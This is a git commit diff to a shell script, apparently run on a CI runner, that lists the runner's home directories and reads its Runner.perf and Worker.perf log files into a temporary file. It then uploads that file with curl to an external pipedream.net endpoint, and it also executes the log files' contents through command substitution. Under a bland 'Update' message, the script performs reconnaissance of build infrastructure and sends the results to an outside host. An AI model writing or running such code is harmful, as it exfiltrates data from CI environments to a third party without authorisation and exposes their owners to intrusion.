66609543f718ba56751c26e8110ee7d4a96d59f4
_m <matiasesena@gmail.com>
2021-11-04 17:23:21 -0300

    Update falopa2.sh

--- falopa2.sh
+++ falopa2.sh
@@ -1,13 +1,22 @@
 #!/bin/bash
 
-ls -1la /home/runner/perflog > /tmp/file.txt
+echo "--- START ---" > /tmp/file.txt
+
+#ls -1la /home >> /tmp/file.txt
+#echo "---" >> /tmp/file.txt
+#ls -1la /home/runner >> /tmp/file.txt
+#echo "---" >> /tmp/file.txt
+#ls -1la /home/runneradmin >> /tmp/file.txt
+#echo "---" >> /tmp/file.txt
+
+
+ls -1la /home/runner/perflog >> /tmp/file.txt
 echo "---" >> /tmp/file.txt
-ls -1la /home >> /tmp/file.txt
+$(cat /home/runner/perflog/Runner.perf) >> /tmp/file.txt
 echo "---" >> /tmp/file.txt
-ls -1la /home/runner >> /tmp/file.txt
-echo "---" >> /tmp/file.txt
-ls -1la /home/runneradmin >> /tmp/file.txt
-echo "---" >> /tmp/file.txt
+$(cat /home/runner/perflog/Worker.perf) >> /tmp/file.txt
+
+echo "--- FINISH ---" >> /tmp/file.txt
 
 curl --data-binary "@/tmp/file.txt" https://en0liva7dzyvpp.x.pipedream.net/
 
